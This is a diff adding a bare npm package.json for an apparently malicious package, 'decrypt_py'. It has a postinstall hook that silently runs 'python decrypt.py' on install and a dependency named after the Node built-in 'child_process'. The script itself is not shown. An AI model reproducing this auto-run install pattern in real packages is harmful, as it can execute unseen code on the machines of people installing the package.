@@ -1,0 +1,20 @@
+{
+  "name": "decrypt_py",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "python decrypt.py",
+    "python-script": "python decrypt.py"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/npm/security-holder.git"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "child_process": "^1.0.2"
+  }
+}
